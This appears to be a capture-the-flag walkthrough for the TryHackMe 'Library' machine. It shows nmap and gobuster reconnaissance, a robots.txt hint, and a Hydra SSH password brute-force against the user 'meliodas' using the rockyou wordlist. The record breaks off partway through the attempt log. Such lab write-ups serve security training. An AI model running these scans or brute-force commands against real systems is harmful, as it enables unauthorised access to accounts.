---
boot2root machine for FIT and bsides guatemala CTF
---

![222](https://tryhackme-images.s3.amazonaws.com/room-icons/484c37bcb5b90fac35d15f0c5ccdaed6.jpeg)


 Library

 Start Machine

Read user.txt and root.txt

Answer the questions below

```
┌──(kali㉿kali)-[~]
└─$ rustscan -a 10.10.253.155 --ulimit 5500 -b 65535 -- -A
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
🌍HACK THE PLANET🌍

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[~] Automatically increasing ulimit value to 5500.
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
Open 10.10.253.155:22
Open 10.10.253.155:80
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

[~] Starting Nmap 7.93 ( https://nmap.org ) at 2022-12-26 13:09 EST
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 13:09
Completed NSE at 13:09, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 13:09
Completed NSE at 13:09, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 13:09
Completed NSE at 13:09, 0.00s elapsed
Initiating Ping Scan at 13:09
Scanning 10.10.253.155 [2 ports]
Completed Ping Scan at 13:09, 0.18s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 13:09
Completed Parallel DNS resolution of 1 host. at 13:09, 0.01s elapsed
DNS resolution of 1 IPs took 0.01s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 13:09
Scanning 10.10.253.155 [2 ports]
Discovered open port 22/tcp on 10.10.253.155
Discovered open port 80/tcp on 10.10.253.155
Completed Connect Scan at 13:09, 0.19s elapsed (2 total ports)
Initiating Service scan at 13:09
Scanning 2 services on 10.10.253.155
Completed Service scan at 13:09, 6.40s elapsed (2 services on 1 host)
NSE: Script scanning 10.10.253.155.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 13:09
Completed NSE at 13:09, 5.84s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 13:09
Completed NSE at 13:09, 0.76s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 13:09
Completed NSE at 13:09, 0.00s elapsed
Nmap scan report for 10.10.253.155
Host is up, received syn-ack (0.18s latency).
Scanned at 2022-12-26 13:09:10 EST for 13s

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c42fc34767063204ef92918e0587d5dc (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC/X/Zd2/Rc7PrxR+K9bGX9i7Imk3JlU274UsMqM6X03THehc6XUvg0URMryl9IldYLjQvD0fadIg1jB8rCxqzRiJi35nw7ICUXnpZryDS/guLb94Sb9IrLWBTNNdUWV7bTb4gMaGHdyQAmKY62FgL2aKUFMn8SpxJu0WiVIQgcKkv15s17rNqVD39kG8x/bfdftcjn/YtEP09Sy4z1FqXF9FT1xWKaVr3Pd5rCAU4rpOzVpS+qTj77NWaXNDlcg3aCRaILD+4lquq8kVAA+VcXR9IwXOTKJRzRCMfYwd3M6QC45LlRa17xvhI++vBtCcGwxuD9JZsXu0Cd/5fdisrl
|   256 689213ec9479dcbb7702da99bfb69db0 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBI8Oi4FyiWylek0a1n1TD1/TBOi2uXVPfqoSo1C56D1rJlv4g2g6SDJjW29bhodoVO6W8VdWNQGiyJ5QW2XirHI=
|   256 43e824fcd8b8d3aac248089751dc5b7d (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOPQQrT4KT/PF+8i33LGgs0c83MQL1m863niSGsBDfCN
80/tcp open  http    syn-ack Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 1 disallowed entry 
|_/
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Welcome to  Blog - Library Machine
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 13:09
Completed NSE at 13:09, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 13:09
Completed NSE at 13:09, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 13:09
Completed NSE at 13:09, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.70 seconds

┌──(kali㉿kali)-[~]
└─$ gobuster dir -u http://10.10.253.155/ -w /usr/share/wordlists/dirb/common.txt -t 64 -k 
===============================================================
Gobuster v3.3
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.253.155/
[+] Method:                  GET
[+] Threads:                 64
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.3
[+] Timeout:                 10s
===============================================================
2022/12/26 13:17:01 Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 292]
/.htaccess            (Status: 403) [Size: 297]
/.htpasswd            (Status: 403) [Size: 297]
/images               (Status: 301) [Size: 315] [--> http://10.10.253.155/images/]
/index.html           (Status: 200) [Size: 5439]
/robots.txt           (Status: 200) [Size: 33]
/server-status        (Status: 403) [Size: 301]
Progress: 4614 / 4615 (99.98%)===============================================================
2022/12/26 13:17:15 Finished
===============================================================

view-source:http://10.10.253.155/robots.txt

User-agent: rockyou 
Disallow: / 



Posted on June 29th 2009 by meliodas - 3 comments

bruteforce (hydra)

┌──(kali㉿kali)-[~]
└─$ hydra -l meliodas -P /usr/share/wordlists/rockyou.txt 10.10.253.155 ssh -V -t 64
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-12-26 13:20:18
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 64 tasks per 1 server, overall 64 tasks, 14344399 login tries (l:1/p:14344399), ~224132 tries per task
[DATA] attacking ssh://10.10.253.155:22/
[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "123456" - 1 of 14344399 [child 0] (0/0)
[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "12345" - 2 of 14344399 [child 1] (0/0)
[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "123456789" - 3 of 14344399 [child 2] (0/0)
[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "password" - 4 of 14344399 [child 3] (0/0)
[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "iloveyou" - 5 of 14344399 [child 4] (0/0)
[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "princess" - 6 of 14344399 [child 5] (0/0)
[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "1234567" - 7 of 14344399 [child 6] (0/0)
[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "rockyou" - 8 of 14344399 [child 7] (0/0)
[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "12345678" - 9 of 14344399 [child 8] (0/0)
[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "abc123" - 10 of 14344399 [child 9] (0/0)
[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "nicole" - 11 of 14344399 [child 10] (0/0)
[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "daniel" - 12 of 14344399 [child 11] (0/0)
[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "babygirl" - 13 of 14344399 [child 12] (0/0)
[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "monkey" - 14 of 14344399 [child 13] (0/0)
[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "lovely" - 15 of 14344399 [child 14] (0/0)
[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "jessica" - 16 of 14344399 [child 15] (0/0)
[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "654321" - 17 of 14344399 [child 16] (0/0)
[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "michael" - 18 of 14344399 [child 17] (0/0)
[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "ashley" - 19 of 14344399 [child 18] (0/0)
[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "qwerty" - 20 of 14344399 [child 19] (0/0)
[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "111111" - 21 of 14344399 [child 20] (0/0)
[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "iloveu" - 22 of 14344399 [child 21] (0/0)
[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "000000" - 23 of 14344399 [child 22] (0/0)
[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "michelle" - 24 of 14344399 [child 23] (0/0)
[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "tigger" - 25 of 14344399 [child 24] (0/0)
[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "sunshine" - 26 of 14344399 [child 25] (0/0)
[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "chocolate" - 27 of 14344399 [child 26] (0/0)
[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "password1" - 28 of 14344399 [child 27] (0/0)
[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "soccer" - 29 of 14344399 [child 28] (0/0)
[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "anthony" - 30 of 14344399 [child 29] (0/0)
[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "friends" - 31 of 14344399 [child 30] (0/0)
[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "butterfly" - 32 of 14344399 [child 31] (0/0)
[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "purple" - 33 of 14344399 [child 32] (0/0)
[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "angel" - 34 of 14344399 [child 33] (0/0)
[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "jordan" - 35 of 14344399 [child 34] (0/0)
[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "liverpool" - 36 of 14344399 [child 35] (0/0)
[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "justin" - 37 of 14344399 [child 36] (0/0)
[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "loveme" - 38 of 14344399 [child 37] (0/0)
[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "fuckyou" - 39 of 14344399 [child 38] (0/0)
[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "123123" - 40 of 14344399 [child 39] (0/0)
[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "football" - 41 of 14344399 [child 40] (0/0)
[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "secret" - 42 of 14344399 [child 41] (0/0)
[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "andrea" - 43 of 14344399 [child 42] (0/0)
[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "carlos" - 44 of 14344399 [child 43] (0/0)
[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "jennifer" - 45 of 14344399 [child 44] (0/0)
[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "joshua" - 46 of 14344399 [child 45] (0/0)
[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "bubbles" - 47 of 14344399 [child 46] (0/0)
[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "1234567890" - 48 of 14344399 [child 47] (0/0)
[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "superman" - 49 of 14344399 [child 48] (0/0)
[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "hannah" - 50 of 14344399 [child 49] (0/0)
[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "amanda" - 51 of 14344399 [child 50] (0/0)
[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "loveyou" - 52 of 14344399 [child 51] (0/0)
[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "pretty" - 53 of 14344399 [child 52] (0/0)
[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "basketball" - 54 of 14344399 [child 53] (0/0)
[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "andrew" - 55 of 14344399 [child 54] (0/0)
[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "angels" - 56 of 14344399 [child 55] (0/0)
[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "tweety" - 57 of 14344399 [child 56] (0/0)
[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "flower" - 58 of 14344399 [child 57] (0/0)
[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "playboy" - 59 of 14344399 [child 58] (0/0)
[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "hello" - 60 of 14344399 [child 59] (0/0)
[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "elizabeth" - 61 of 14344399 [child 60] (0/0)
[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "hottie" - 62 of 14344399 [child 61] (0/0)
[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "tinkerbell" - 63 of 14344399 [child 62] (0/0)
[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "charlie" - 64 of 14344399 [child 63] (0/0)
[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "samantha" - 65 of 14344422 [child 21] (0/23)
[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "barbie" - 66 of 14344422 [child 22] (0/23)
[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "chelsea" - 67 of 14344422 [child 5] (0/23)
[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "lovers" - 68 of 14344422 [child 56] (0/23)
[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "teamo" - 69 of 14344422 [child 58] (0/23)
[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "jasmine" - 70 of 14344422 [child 0] (0/23)
[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "brandon" - 71 of 14344422 [child 1] (0/23)
[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "666666" - 72 of 14344422 [child 3] (0/23)
[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "shadow" - 73 of 14344422 [child 4] (0/23)
[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "melissa" - 74 of 14344422 [child 6] (0/23)
[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "eminem" - 75 of 14344422 [child 7] (0/23)
[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "matthew" - 76 of 14344422 [child 8] (0/23)
[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "robert" - 77 of 14344422 [child 9] (0/23)
[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "danielle" - 78 of 14344422 [child 11] (0/23)
[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "forever" - 79 of 14344422 [child 12] (0/23)
[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "family" - 80 of 14344422 [child 13] (0/23)
[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "jonathan" - 81 of 14344422 [child 14] (0/23)
[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "987654321" - 82 of 14344422 [child 17] (0/23)
[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "computer" - 83 of 14344422 [child 18] (0/23)
[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "whatever" - 84 of 14344422 [child 19] (0/23)
[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "dragon" - 85 of 14344422 [child 20] (0/23)
[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "vanessa" - 86 of 14344422 [child 23] (0/23)
[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "cookie" - 87 of 14344422 [child 24] (0/23)
[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "naruto" - 88 of 14344422 [child 25] (0/23)
[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "summer" - 89 of 14344422 [child 32] (0/23)
[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "sweety" - 90 of 14344422 [child 34] (0/23)
[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "spongebob" - 91 of 14344422 [child 35] (0/23)
[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "joseph" - 92 of 14344422 [child 37] (0/23)
[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "junior" - 93 of 14344422 [child 38] (0/23)
[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "softball" - 94 of 14344422 [child 39] (0/23)
[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "taylor" - 95 of 14344422 [child 41] (0/23)
[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "yellow" - 96 of 14344422 [child 42] (0/23)
[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "daniela" - 97 of 14344422 [child 43] (0/23)
[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "lauren" - 98 of 14344422 [child 45] (0/23)
[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "mickey" - 99 of 14344422 [child 51] (0/23)
[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "princesa" - 100 of 14344422 [child 53] (0/23)
[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "alexandra" - 101 of 14344422 [child 55] (0/23)
[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "alexis" - 102 of 14344422 [child 59] (0/23)
[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "jesus" - 103 of 14344422 [child 60] (0/23)
[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "estrella" - 104 of 14344422 [child 62] (0/23)
[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "miguel" - 105 of 14344422 [child 63] (0/23)
[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "william" - 106 of 14344422 [child 21] (0/23)
[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "thomas" - 107 of 14344422 [child 22] (0/23)
[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "beautiful" - 108 of 14344422 [child 5] (0/23)
[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "mylove" - 109 of 14344422 [child 0] (0/23)
[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "angela" - 110 of 14344422 [child 9] (0/23)
[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "poohbear" - 111 of 14344422 [child 32] (0/23)
[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "patrick" - 112 of 14344422 [child 56] (0/23)
[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "iloveme" - 113 of 14344422 [child 14] (0/23)
[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "sakura" - 114 of 14344422 [child 41] (0/23)
[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "adrian" - 115 of 14344422 [child 59] (0/23)
[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "alexander" - 116 of 14344422 [child 17] (0/23)
[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "destiny" - 117 of 14344422 [child 60] (0/23)
[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "christian" - 118 of 14344422 [child 62] (0/23)
[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "121212" - 119 of 14344422 [child 63] (0/23)
[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "sayang" - 120 of 14344422 [child 7] (0/23)
[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "america" - 121 of 14344422 [child 38] (0/23)
[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "dancer" - 122 of 14344422 [child 19] (0/23)
[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "monica" - 123 of 14344422 [child 34] (0/23)
[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "richard" - 124 of 14344422 [child 42] (0/23)
[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "112233" - 125 of 14344422 [child 51] (0/23)
[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "princess1" - 126 of 14344422 [child 6] (0/23)
[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "555555" - 127 of 14344422 [child 23] (0/23)
[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "diamond" - 128 of 14344422 [child 37] (0/23)
[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "carolina" - 129 of 14344422 [child 1] (0/23)
[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "steven" - 130 of 14344422 [child 3] (0/23)
[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "rangers" - 131 of 14344422 [child 4] (0/23)
[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "louise" - 132 of 14344422 [child 8] (0/23)
[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "orange" - 133 of 14344422 [child 11] (0/23)
[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "789456" - 134 of 14344422 [child 12] (0/23)
[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "999999" - 135 of 14344422 [child 13] (0/23)
[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "shorty" - 136 of 14344422 [child 18] (0/23)
[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "11111" - 137 of 14344422 [child 20] (0/23)
[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "nathan" - 138 of 14344422 [child 24] (0/23)
[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "snoopy" - 139 of 14344422 [child 25] (0/23)
[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "gabriel" - 140 of 14344422 [child 35] (0/23)
[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "hunter" - 141 of 14344422 [child 39] (0/23)
[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "cherry" - 142 of 14344422 [child 43] (0/23)
[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "killer" - 143 of 14344422 [child 45] (0/23)
[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "sandra" - 144 of 14344422 [child 53] (0/23)
[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "alejandro" - 145 of 14344422 [child 55] (0/23)
[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "buster" - 146 of 14344422 [child 58] (0/23)
[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "george" - 147 of 14344422 [child 0] (0/23)
[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "brittany" - 148 of 14344422 [child 21] (0/23)
[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "alejandra" - 149 of 14344422 [child 22] (0/23)
[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "patricia" - 150 of 14344422 [child 5] (0/23)
[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "rachel" - 151 of 14344422 [child 23] (0/23)
[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "tequiero" - 152 of 14344422 [child 6] (0/23)
[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "7777777" - 153 of 14344422 [child 37] (0/23)
[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "cheese" - 154 of 14344422 [child 41] (0/23)
[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "159753" - 155 of 14344422 [child 59] (0/23)
[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "arsenal" - 156 of 14344422 [child 3] (0/23)
[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "dolphin" - 157 of 14344422 [child 14] (0/23)
[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "antonio" - 158 of 14344422 [child 38] (0/23)
[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "heather" - 159 of 14344422 [child 39] (0/23)
[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "david" - 160 of 14344422 [child 43] (0/23)
[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "ginger" - 161 of 14344422 [child 13] (0/23)
[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "stephanie" - 162 of 14344422 [child 24] (0/23)
[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "peanut" - 163 of 14344422 [child 25] (0/23)
[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "blink182" - 164 of 14344422 [child 35] (0/23)
[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "sweetie" - 165 of 14344422 [child 53] (0/23)
[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "222222" - 166 of 14344422 [child 62] (0/23)
[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "beauty" - 167 of 14344422 [child 45] (0/23)
[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "987654" - 168 of 14344422 [child 56] (0/23)
[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "victoria" - 169 of 14344422 [child 63] (0/23)
[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "honey" - 170 of 14344422 [child 11] (0/23)
[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "00000" - 171 of 14344422 [child 19] (0/23)
[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "fernando" - 172 of 14344422 [child 20] (0/23)
[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "pokemon" - 173 of 14344422 [child 32] (0/23)
[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "maggie" - 174 of 14344422 [child 58] (0/23)
[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "corazon" - 175 of 14344422 [child 60] (0/23)
[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "chicken" - 176 of 14344422 [child 1] (0/23)
[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "pepper" - 177 of 14344422 [child 4] (0/23)
[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "cristina" - 178 of 14344422 [child 7] (0/23)
[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "rainbow" - 179 of 14344422 [child 8] (0/23)
[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "kisses" - 180 of 14344422 [child 9] (0/23)
[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "manuel" - 181 of 14344422 [child 12] (0/23)
[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "myspace" - 182 of 14344422 [child 17] (0/23)
[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "rebelde" - 183 of 14344422 [child 18] (0/23)
[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "angel1" - 184 of 14344422 [child 34] (0/23)
[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "ricardo" - 185 of 14344422 [child 42] (0/23)
[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "babygurl" - 186 of 14344422 [child 51] (0/23)
[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "heaven" - 187 of 14344422 [child 55] (0/23)
[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "55555" - 188 of 14344422 [child 0] (0/23)
[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "baseball" - 189 of 14344422 [child 21] (0/23)
[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "martin" - 190 of 14344422 [child 22] (0/23)
[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "greenday" - 191 of 14344422 [child 5] (0/23)
[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "november" - 192 of 14344422 [child 23] (0/23)
[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "alyssa" - 193 of 14344422 [child 13] (0/23)
[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "madison" - 194 of 14344422 [child 37] (0/23)
[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "mother" - 195 of 14344422 [child 38] (0/23)
[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "123321" - 196 of 14344422 [child 43] (0/23)
[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "123abc" - 197 of 14344422 [child 6] (0/23)
[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "mahalkita" - 198 of 14344422 [child 17] (0/23)
[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "batman" - 199 of 14344422 [child 32] (0/23)
[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "september" - 200 of 14344422 [child 41] (0/23)
[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "december" - 201 of 14344422 [child 60] (0/23)
[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "morgan" - 202 of 14344422 [child 4] (0/23)
[ATTEMPT] target 10.10.253.155 - login "meliodas" - pass "mariposa" - 203 of 14344422 [child 7] (0/23)
